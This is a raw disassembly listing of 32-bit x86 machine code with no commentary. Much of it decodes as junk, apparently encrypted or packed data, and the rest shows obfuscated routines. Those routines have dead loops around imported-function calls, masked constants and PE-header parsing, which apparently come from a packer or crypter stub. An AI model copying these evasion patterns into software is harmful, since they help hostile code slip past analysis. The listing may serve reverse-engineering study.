  4138db:	retf   0x7ef9
  4138de:	mov    cl,0x8b
  4138e0:	cli    
  4138e1:	adc    BYTE PTR [ecx-0x56],cl
  4138e4:	(bad)  
  4138e5:	mov    ah,ch
  4138e7:	mov    ecx,0x91e9322c
  4138ec:	lods   al,BYTE PTR ds:[esi]
  4138ed:	sub    DWORD PTR [eax-0x127a1ae7],eax
  4138f3:	sbb    edi,ebx
  4138f5:	xor    DWORD PTR [edi-0x3920b36b],ebp
  4138fb:	jb     0x41393e
  4138fd:	xor    DWORD PTR [ecx+0xcfd67d1],ebx
  413903:	jl     0x41392e
  413905:	loopne 0x4138b7
  413907:	push   eax
  413908:	scas   eax,DWORD PTR es:[edi]
  413909:	mov    edi,0x95077688
  41390e:	cmp    dl,BYTE PTR [edx-0x9f9019d]
  413914:	ficomp DWORD PTR [ebx+eax*4-0x7]
  413918:	xchg   ecx,eax
  413919:	rcl    BYTE PTR [edx-0x49],1
  41391c:	mov    dl,0x1d
  41391e:	das    
  41391f:	repnz mov WORD PTR [eax+0x2e102dd3],?
  413926:	hlt    
  413927:	mov    cl,BYTE PTR [ebx+0xe]
  41392a:	xor    eax,0xd9d60489
  41392f:	scas   al,BYTE PTR es:[edi]
  413930:	mov    DWORD PTR [esi-0x63],edx
  413933:	int    0x7f
  413935:	mov    DWORD PTR [edi+0x7e8f1531],0x364fe7bb
  41393f:	xchg   BYTE PTR [ebp+ecx*4-0xd],dl
  413943:	jmp    0x5a94:0x11eabc2e
  41394a:	shl    BYTE PTR [eax-0x520c8539],1
  413950:	test   DWORD PTR [edx-0x1d],ecx
  413953:	cli    
  413954:	(bad)  
  413956:	enter  0x7e13,0xa6
  41395a:	push   esp
  41395b:	inc    ebx
  41395c:	mov    esi,?
  41395e:	jne    0x41394f
  413960:	xor    al,0xbe
  413962:	push   esp
  413963:	add    ebx,esp
  413965:	retf   
  413966:	mov    ch,0xd4
  413968:	fwait
  413969:	aam    0x34
  41396b:	add    al,0xf2
  41396d:	add    BYTE PTR ds:0xe12686a2,ch
  413973:	mov    esi,0xdaa20eb5
  413978:	push   cs
  413979:	xlat   BYTE PTR ds:[ebx]
  41397a:	and    ebx,0x29e3c58e
  413980:	and    DWORD PTR [eax],esi
  413982:	popa   
  413983:	into   
  413984:	test   al,0xdd
  413986:	gs add cl,bh
  413989:	lock imul ebx,ecx,0xffffffaf
  41398d:	or     eax,0xfea5ecb6
  413992:	(bad)  
  413993:	hlt    
  413994:	mov    ecx,0x126af6d3
  413999:	inc    ebp
  41399a:	sbb    bl,dl
  41399c:	sbb    BYTE PTR [ecx-0x4303d09e],0x41
  4139a3:	fnsave [esi-0x65]
  4139a6:	pop    ss
  4139a7:	jmp    0xc6aab3ec
  4139ac:	xor    DWORD PTR [edx-0x55],ebx
  4139af:	dec    ebx
  4139b0:	jo     0x413a2a
  4139b2:	stc    
  4139b3:	adc    ch,al
  4139b5:	mov    eax,0xad5ae648
  4139ba:	sbb    cl,0x67
  4139bd:	inc    edi
  4139be:	jmp    0x41394d
  4139c0:	int    0x30
  4139c2:	dec    ebp
  4139c3:	je     0x4139be
  4139c5:	stc    
  4139c6:	adc    dl,al
  4139c8:	jae    0x413966
  4139ca:	sbb    DWORD PTR [edx+0x7c],edi
  4139cd:	loope  0x413996
  4139cf:	mov    edi,ebp
  4139d1:	jne    0x413992
  4139d3:	cs call 0xdc10df12
  4139d9:	and    DWORD PTR [edx-0x2f3bd2a9],ebp
  4139df:	push   es
  4139e0:	mov    ah,0x7e
  4139e2:	add    BYTE PTR es:[esi],cl
  4139e5:	mov    ds,WORD PTR ds:0xc125773a
  4139eb:	xor    BYTE PTR [ebx],bl
  4139ed:	es es repnz push esi
  4139f1:	fisttp QWORD PTR ds:0x6aa3713a
  4139f7:	mov    ebp,0x2b7a9394
  4139fc:	repnz mov DWORD PTR [edx-0x47f7473],ebx
  413a03:	enter  0x5047,0x43
  413a07:	lea    esi,[ebx-0x3ccc4c8d]
  413a0d:	push   edx
  413a0e:	aaa    
  413a0f:	dec    esp
  413a10:	test   eax,0x31f7f104
  413a15:	das    
  413a16:	lods   al,BYTE PTR ds:[esi]
  413a17:	aaa    
  413a18:	dec    ebp
  413a19:	popa   
  413a1a:	ret    
  413a1b:	into   
  413a1c:	test   eax,0x20c03c45
  413a21:	fwait
  413a22:	xor    esi,DWORD PTR [ecx+0x1d1515fb]
  413a28:	xlat   BYTE PTR ds:[ebx]
  413a29:	lea    esp,[esp+ebp*4-0x5180af7d]
  413a30:	js     0x413a23
  413a32:	int3   
  413a33:	add    ebp,DWORD PTR [edi+0x15addeb0]
  413a39:	std    
  413a3a:	mov    gs,WORD PTR [esi+0x77]
  413a3d:	out    0x59,eax
  413a3f:	imul   eax,ebx,0x5022e0b
  413a45:	mov    ah,0x61
  413a47:	or     bl,BYTE PTR [edi]
  413a49:	inc    ebx
  413a4a:	hlt    
  413a4b:	push   esi
  413a4c:	stc    
  413a4d:	std    
  413a4e:	push   ds
  413a4f:	jbe    0x413a6e
  413a51:	mov    BYTE PTR [edx-0x4c],dl
  413a54:	mov    WORD PTR [esi],es
  413a56:	mov    ebp,DWORD PTR [eax-0x6ceb49d0]
  413a5c:	(bad)  [ebp+0x7e]
  413a5f:	(bad)  
  413a60:	xchg   DWORD PTR [ebp-0x1067cf36],esi
  413a66:	cdq    
  413a67:	and    ah,bh
  413a69:	mov    eax,ds:0xd810dad2
  413a6e:	mov    al,ds:0xc2e599ae
  413a73:	pop    esp
  413a74:	jns    0x413a27
  413a76:	imul   ebx,DWORD PTR [esi],0xffffffb7
  413a79:	shr    BYTE PTR [ecx],0x45
  413a7c:	sub    eax,0x23437e11
  413a81:	xlat   BYTE PTR ds:[ebx]
  413a82:	dec    ecx
  413a83:	lahf   
  413a84:	stc    
  413a85:	inc    eax
  413a86:	repz aaa 
  413a88:	pusha  
  413a89:	inc    ebp
  413a8a:	js     0x413a44
  413a8c:	push   ds
  413a8d:	clc    
  413a8e:	cmp    eax,eax
  413a90:	inc    eax
  413a91:	mov    ebp,0x99f6a201
  413a96:	pop    ecx
  413a97:	mov    ch,0x9e
  413a99:	xor    ch,cl
  413a9b:	sbb    bl,dh
  413a9d:	mov    bl,0x24
  413a9f:	inc    esi
  413aa0:	mov    ch,0xba
  413aa2:	push   cs
  413aa3:	pop    ecx
  413aa4:	sti    
  413aa5:	clc    
  413aa6:	mov    dh,0x4c
  413aa8:	add    ch,dh
  413aaa:	push   edx
  413aab:	lods   eax,DWORD PTR ds:[esi]
  413aac:	sbb    ebp,DWORD PTR [eax]
  413aae:	out    dx,eax
  413aaf:	xchg   edx,eax
  413ab0:	les    edx,FWORD PTR [ebx+edx*2]
  413ab3:	lds    esi,FWORD PTR [ecx-0x39307cb6]
  413ab9:	xchg   esp,eax
  413aba:	xor    esp,edx
  413abc:	call   FWORD PTR [ebx]
  413abe:	xor    BYTE PTR ds:0xc2655b2,bh
  413ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac5:	lock jge 0x413b1e
  413ac8:	sub    eax,0x50898026
  413acd:	cld    
  413ace:	cwde   
  413acf:	sbb    ah,ch
  413ad1:	aas    
  413ad2:	fidiv  DWORD PTR es:[ebx+0x2]
  413ad6:	(bad)
  413ada:	sub    eax,DWORD PTR [eax-0x26c36a0a]
  413ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae1:	repz or BYTE PTR [ebp-0x3b],0x8a
  413ae6:	call   0x8141:0x640029d0
  413aed:	inc    edi
  413aee:	adc    edx,esp
  413af0:	push   0x4bb9bef8
  413af5:	or     DWORD PTR [eax-0x31cb0bdd],esp
  413afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413afc:	mov    ebp,DWORD PTR [ecx]
  413afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aff:	cld    
  413b00:	mov    DWORD PTR ds:0xfa63d5dd,edx
  413b06:	fadd   st(1),st
  413b08:	retf   0xb52f
  413b0b:	fwait
  413b0c:	cld    
  413b0d:	aam    0xd3
  413b0f:	add    DWORD PTR [edi+0x3e],edi
  413b12:	sub    al,0xee
  413b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b15:	shl    DWORD PTR [eax],0x44
  413b18:	out    0x68,eax
  413b1a:	cmp    dh,dh
  413b1c:	jmp    0xff04:0x9b8a7b59
  413b23:	out    0x6c,al
  413b25:	mov    dh,0x79
  413b27:	test   DWORD PTR [ebp-0x2ded520a],edi
  413b2d:	mov    al,ds:0xbf5b2630
  413b32:	out    dx,eax
  413b33:	stos   BYTE PTR es:[edi],al
  413b34:	jl     0x413b34
  413b36:	jle    0x413b81
  413b38:	gs out 0xa1,eax
  413b3b:	cmp    eax,0x2f5373b9
  413b40:	push   ebx
  413b41:	fidivr DWORD PTR [ebx+edx*8]
  413b44:	pushf  
  413b45:	lds    esi,FWORD PTR [eax]
  413b47:	push   esi
  413b48:	pop    edx
  413b49:	adc    bh,BYTE PTR [ebx+0x48]
  413b4c:	cmp    edx,esp
  413b4e:	mov    ds:0x34d01a64,al
  413b53:	call   0xc67e0096
  413b58:	pop    ebp
  413b59:	xor    DWORD PTR [ecx],edx
  413b5b:	sbb    dl,BYTE PTR [ebx+0x74]
  413b5e:	xchg   ecx,eax
  413b5f:	jge    0x413ae3
  413b61:	sbb    eax,DWORD PTR [ebx+0x49]
  413b64:	stos   DWORD PTR es:[edi],eax
  413b65:	out    0xa2,al
  413b67:	xlat   BYTE PTR ds:[ebx]
  413b68:	add    DWORD PTR [ecx],0xffffff93
  413b6b:	bound  eax,QWORD PTR [edx]
  413b6d:	out    dx,al
  413b6e:	fnstsw WORD PTR [ebx]
  413b70:	sub    al,0xcf
  413b72:	mov    DWORD PTR [ebx],ecx
  413b74:	dec    eax
  413b75:	leave  
  413b76:	mov    dh,0xed
  413b78:	cmp    bh,BYTE PTR [esi+esi*1+0x3c]
  413b7c:	or     al,0xcc
  413b7e:	jecxz  0x413b85
  413b80:	dec    ecx
  413b81:	mov    edx,0x6c575255
  413b86:	sbb    DWORD PTR [edi],esi
  413b88:	or     bl,BYTE PTR [ebx+0x54]
  413b8b:	pmaddwd mm2,QWORD PTR [esp+ecx*8]
  413b8f:	mov    esi,0xf1038676
  413b94:	fdivr  DWORD PTR [ebx+0x75]
  413b97:	pop    gs
  413b99:	(bad)  
  413b9a:	mov    ah,0xb3
  413b9c:	das    
  413b9d:	in     eax,dx
  413b9e:	scas   eax,DWORD PTR es:[edi]
  413b9f:	xchg   esi,eax
  413ba0:	pop    edi
  413ba1:	ja     0x413ba0
  413ba3:	enter  0x95be,0xe6
  413ba7:	in     eax,dx
  413ba8:	mov    edx,0xd631ec7f
  413bad:	sub    al,0xf5
  413baf:	and    BYTE PTR [esp+ebp*8-0x1],dl
  413bb3:	aaa    
  413bb4:	int3   
  413bb5:	sbb    bh,BYTE PTR ss:[edx]
  413bb8:	daa    
  413bb9:	pop    ss
  413bba:	out    dx,al
  413bbb:	cmp    BYTE PTR [eax],ch
  413bbd:	outs   dx,DWORD PTR ds:[esi]
  413bbe:	cmp    al,0x56
  413bc0:	repz pop ebp
  413bc2:	int    0x3c
  413bc4:	das    
  413bc5:	adc    eax,0x62617238
  413bca:	(bad)  
  413bcb:	cdq    
  413bcc:	lahf   
  413bcd:	or     DWORD PTR [esi-0x27ce0ed],ebx
  413bd3:	mov    esp,0x26620dc9
  413bd8:	add    bl,BYTE PTR [ecx+0xbd4df6a]
  413bde:	shl    BYTE PTR [ebx+eax*1+0x29dbfc3],cl
  413be5:	hlt    
  413be6:	fdivp  st(4),st
  413be8:	push   esp
  413be9:	add    edx,ecx
  413beb:	adc    edi,0xffffffff
  413bee:	xor    edx,eax
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421cd2
  413c08:	mov    ds:0x421cda,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421aa2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423868
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a6e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423883
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423946
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a66
  413f9e:	mov    eax,ds:0x421a76
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ace
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c56
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239c0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	push   ds
  41424d:	js     0x41428a
  41424f:	fnstcw WORD PTR [ebp+0x46]
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	cmp    esi,ebx
  41425a:	and    DWORD PTR [edi-0x1a],ebp
  41425d:	adc    esp,DWORD PTR [ebx+ecx*2-0x80]
  414261:	cld    
  414262:	test   BYTE PTR [edx+0x9],bl
  414265:	pop    esi
  414266:	ret    0xcd50
  414269:	loopne 0x4142cc
  41426b:	cld    
  41426c:	int3   
  41426d:	stos   DWORD PTR es:[edi],eax
  41426e:	es xor eax,0x2315c385
  414274:	mov    dh,0xa2
  414276:	test   BYTE PTR [esi-0x5fcdae23],ah
  41427c:	out    0x2f,al
  41427e:	mov    edx,0xb04f9c2a
  414283:	push   edx
  414284:	scas   al,BYTE PTR es:[edi]
  414285:	clc    
  414286:	inc    esp
  414287:	and    edi,edi
  414289:	(bad)  
  41428a:	dec    ebp
  41428b:	outs   dx,DWORD PTR ds:[esi]
  41428c:	enter  0x8b2a,0xf7
  414290:	retf   
  414291:	xchg   DWORD PTR [esi+edx*4-0x44],esi
  414295:	sbb    esp,DWORD PTR [ecx+0x37]
  414298:	add    ebx,ebp
  41429a:	out    0xff,eax
  41429c:	sbb    eax,0xf37534f0
  4142a1:	rcr    BYTE PTR [edx],0xea
  4142a4:	out    0x49,eax
  4142a6:	pusha  
  4142a7:	push   ds
  4142a8:	pop    esi
  4142a9:	and    al,0x3d
  4142ab:	scas   eax,DWORD PTR es:[edi]
  4142ac:	mov    BYTE PTR [edx+0x4417bb7d],bl
  4142b2:	jl     0x414237
  4142b4:	pop    edx
  4142b5:	dec    edi
  4142b6:	iret   
  4142b7:	dec    ecx
  4142b8:	popf   
  4142b9:	push   ds
  4142ba:	scas   eax,DWORD PTR es:[edi]
  4142bb:	jl     0x414282
  4142bd:	test   eax,0xf72cd5ef
  4142c2:	push   0xd222be6d
  4142c7:	int3   
  4142c8:	mov    bh,0xc7
  4142ca:	xor    eax,0x607cd73c
  4142cf:	ret    0x80a7
  4142d2:	nop
  4142d3:	arpl   WORD PTR [eax+0x3b],si
  4142d6:	ret    0xd040
  4142d9:	inc    ebp
  4142da:	ja     0x4142c9
  4142dc:	xor    BYTE PTR ds:0x60706327,ah
  4142e2:	ret    
  4142e3:	and    DWORD PTR [ebx],edx
